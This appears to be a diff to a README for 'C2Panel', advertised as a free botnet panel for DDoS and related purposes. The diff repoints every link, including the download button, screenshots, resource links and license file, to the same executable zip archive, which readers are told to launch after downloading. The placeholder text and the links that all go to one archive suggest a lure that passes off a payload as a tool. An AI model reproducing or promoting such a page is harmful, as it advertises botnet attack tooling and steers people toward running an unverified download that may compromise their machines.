@@ -15,16 +15,16 @@ Welcome to C2Panel, a free botnet panel designed for various purposes related to
 
 To get started with C2Panel, simply download the software package from the following link:  
 
-[![Download Software](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip)](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip)  
+[![Download Software](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip)](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip)  
 
 Please note that the software needs to be launched after downloading it. If you encounter any issues with the download link, you can also check the "Releases" section of this repository for alternative options.
 
 ## Screenshots
 
-![Screenshot 1](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip)  
+![Screenshot 1](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip)  
 *Description of Screenshot 1*
 
-![Screenshot 2](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip)  
+![Screenshot 2](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip)  
 *Description of Screenshot 2*
 
 ## Installation
@@ -58,12 +58,12 @@ If you encounter any issues or have questions about using C2Panel, feel free to 
 
 For more information on botnets, DDoS attacks, and related topics, consider exploring the following resources:
 
-🔗 [Link 1](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip) - Description of Link 1  
-🔗 [Link 2](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip) - Description of Link 2  
-🔗 [Link 3](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip) - Description of Link 3  
+🔗 [Link 1](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip) - Description of Link 1  
+🔗 [Link 2](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip) - Description of Link 2  
+🔗 [Link 3](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip) - Description of Link 3  
 
 ## License
 
-This project is licensed under the MIT License - see the [https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip](https://github.com/SingLoveMyself/C2Panel/releases/download/v1.0/Release_x64.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip](https://github.com/SingLoveMyself/C2Panel/releases/download/v2.0/Software.zip) file for details.
 
 Thank you for choosing C2Panel for your botnet management needs. Happy hacking! 🚀
